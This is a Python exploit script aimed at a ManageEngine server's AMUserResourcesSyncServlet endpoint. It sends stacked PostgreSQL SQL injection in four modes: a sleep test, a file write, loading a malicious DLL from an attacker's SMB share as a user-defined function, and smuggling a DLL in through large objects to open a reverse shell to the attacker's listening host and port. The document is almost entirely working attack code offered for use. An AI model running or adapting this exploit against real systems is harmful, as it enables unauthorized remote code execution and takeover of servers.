import requests
import urllib3
import argparse
import binascii
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    # Set Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('payload', type=str, choices=['sleep', 'shell', 'write', 'ezshell'],
                        help='Choose a payload type to send to the server. \'sleep\' will send a 5 second sleep-based timer. \'shell\' will execute \
                        a reverse shell using a loaded UDF DLL in an SMB share. \'write\' will write a file to the root directory. \'ezshell\' uses a \
                        large object import to create a shell.')
    parser.add_argument('target',
                        help='The target IP address running the vulnerable version of ManageEngine. eg: 192.168.0.1')
    shell_group = parser.add_argument_group('shell', 'Arguments required for the \'shell\' payload.')
    shell_group.add_argument('-d', '--dll', 
                        help='The name of your malicious DLL file. eg: test.dll')
    shell_group.add_argument('-l', '--lhost',
                        help='The listening host to capture the reverse shell. Also the host with an SMB server running.')
    shell_group.add_argument('-p', '--lport', type=int,
                        help='The listening port to capture the reverse shell.')
    shell_group.add_argument('-s', '--smbshare',
                        help='The name of the SMB share that is hosting the malicious DLL. eg: testshare')
    shell_group.add_argument('-f', '--function', default='connect_back',
                        help='The name of the function in the DLL that will execute processes. Default is \'connect_back\' (see README)')
    arguments = parser.parse_args()

    # Configure Target Variables
    targethost = arguments.target
    targeturl = f'https://{targethost}:8443/servlet/AMUserResourcesSyncServlet'
    dll_path = arguments.dll
    dll_function = arguments.function

    # Determine Payload Type, Execute It
    if arguments.payload == 'sleep':
        send_sleep_payload(targeturl)

    elif arguments.payload == 'shell':
        shell_required_args = ['dll', 'lhost', 'lport', 'smbshare']
        missing_args = [arg for arg in shell_required_args if getattr(arguments, arg) is None]
        if missing_args:
            parser.error(f"The following arguments are required for the 'shell' payload: {', '.join(f'--{arg}' for arg in missing_args)}")
        lhost = arguments.lhost
        lport = arguments.lport
        smb_dll_path = f"\\\\{lhost}\\{arguments.smbshare}\\{dll_path}"
        send_shell_payload(targeturl, lhost, lport, smb_dll_path, dll_function)

    elif arguments.payload == 'write':
        send_write_payload(targeturl)

    elif arguments.payload == 'ezshell':
        lo_shell_required_args = ['dll', 'lhost', 'lport']
        missing_args = [arg for arg in lo_shell_required_args if getattr(arguments, arg) is None]
        if missing_args:
            parser.error(f"The following arguments are required for the 'ezshell' payload: {', '.join(f'--{arg}' for arg in missing_args)}")
        lhost = arguments.lhost
        lport = arguments.lport
        send_lo_shell_payload(targeturl, lhost, lport, dll_path, dll_function)

    else:
        raise ValueError('You need to provide a valid payload type.')


def send_sleep_payload(targeturl):
    print("Testing the target... (this does not write to the host)")
    print("Target vulnerable if this is hanging...")
    sqli = ";+select+pg_sleep(5);--"
    
    sendGetPayload(targeturl, sqli)


def send_shell_payload(targeturl, lhost, lport, smb_dll_path, dll_function):
    print((f"This exploit will load DLL file from {smb_dll_path} and execute a PostgreSQL user-defined function to connect back to a reverse shell "
    f"at {lhost}:{lport}"))
    sqli = f";+create+or+replace+function+pwngine(text,+integer)+returns+void+as+$${smb_dll_path}$$,+$${dll_function}$$+language+C+strict;+select+pwngine($${lhost}$$,+{lport});--"

    sendGetPayload(targeturl, sqli)


def send_write_payload(targeturl):
    print("Writing to target...")
    sqli = "; copy (select $$pwned$$) to $$c:\\windows\\temp\\test.txt$$;--"

    sendGetPayload(targeturl, sqli)


def send_lo_shell_payload(targeturl, lhost, lport, dll_path, dll_function):
    chunks = 2048
    chunkStorage = []
    with open(f'{dll_path}', 'rb') as f:
        while True:
            chunk = binascii.hexlify(f.read(chunks)).decode("utf-8")
            if not chunk:
                break
            print("Saving chunk: " + chunk[0:6] + "... (Size " + str(len(chunk)) + ")")
            chunkStorage.append(chunk)
    
    print("Stored " + str(len(chunkStorage)) + " contiguous chunks of DLL data.")
    
    delete_lo = ";+select+lo_unlink(1337);--"
    print("Deleting existing LOID...")
    sendGetPayload(targeturl, delete_lo)

    print("Importing into LOID...")
    import_lo = ";+select+lo_import($$c:\\windows\\win.ini$$,+1337);--"
    sendGetPayload(targeturl, import_lo)

    print("Injecting Chunks Into LOID...")
    for i in range(len(chunkStorage)):
        if i == 0:
            inject_lo = f";+update+pg_largeobject+set+data=decode($${chunkStorage[i]}$$,+$$hex$$)+where+loid=1337+and+pageno={i};--"
            print(f"Injecting {chunkStorage[i][0:6]}... into pageno {i}")
        else:
            inject_lo = f";+insert+into+pg_largeobject+(loid,+pageno,+data)+values+(1337,+{i},+decode($${chunkStorage[i]}$$,+$$hex$$));--"
            print(f"Injecting {chunkStorage[i][0:6]}... into pageno {i}")
        sendGetPayload(targeturl, inject_lo)

    print("Exporting LOID...")
    export_lo = ";+select+lo_export(1337,+$$c:\\windows\\temp\\pwn.dll$$);--"
    sendGetPayload(targeturl, export_lo)

    print("Creating UDF...")
    create_udf = f";+create+or+replace+function+ezpwngine(text,+integer)+returns+void+as+$$c:\\windows\\temp\\pwn.dll$$,+$${dll_function}$$+language+C+strict;--"
    sendGetPayload(targeturl, create_udf)

    print("Triggering UDF...")
    trigger_udf = f";+select+ezpwngine($${lhost}$$,+{lport});--"
    sendGetPayload(targeturl, trigger_udf)



def sendGetPayload(targeturl, payload):
    try:
        response = requests.get(targeturl, params=f'ForMasRange=1&userId=1{payload}', verify=False)
        if response.status_code == 200:
            print("[ OK ]: Payload sent via GET!")
    except requests.ConnectionError as e:
        print("[ FAIL ]: Error connecting to target:", e)
        

if __name__ == '__main__':
    main()